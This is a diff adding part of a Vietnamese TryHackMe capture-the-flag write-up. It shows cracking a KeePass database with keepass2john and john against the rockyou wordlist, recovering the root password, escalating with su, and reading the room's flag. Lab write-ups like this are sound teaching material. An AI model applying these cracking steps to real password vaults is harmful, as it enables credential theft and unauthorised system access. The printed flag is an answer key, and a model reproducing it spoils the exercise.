@@ -142,5 +142,33 @@ infrastructure.kdbx.1        100%[==============================================
 2026-07-30 04:48:52 (43.2 MB/s) - ‘infrastructure.kdbx.1’ saved [2439/2439]
 ```
 
+Dung `keepass2john infrastructure.kdbx > kdbx.hash` de encode thanh ma hash <br>
 
+Sau do dung `john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash `
 
+<img width="768" height="185" alt="image" src="https://github.com/user-attachments/assets/43f8dafa-1618-4da8-96f1-2cf2616ac581" />
+
+Tim dc mat khau file `infrastructure.kdbx` la `spring` <br>
+
+Dung `KeePassXC de tim password cho root
+
+<img width="802" height="437" alt="image" src="https://github.com/user-attachments/assets/eb3fa3d2-d67f-4599-aeee-442e5d661da7" />
+
+<img width="811" height="580" alt="image" src="https://github.com/user-attachments/assets/5f26ef7c-af37-4b38-a995-6ea0a6220471" />
+
+```
+sysadmin@tryhackme-2204:~$ su root
+Password: 
+root@tryhackme-2204:~#
+```
+
+```
+root@tryhackme-2204:/# ls
+bin   core  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
+boot  dev   home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
+root@tryhackme-2204:/# cd root
+root@tryhackme-2204:~# ls
+root.txt  snap
+root@tryhackme-2204:~# cat root.txt
+THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
+```
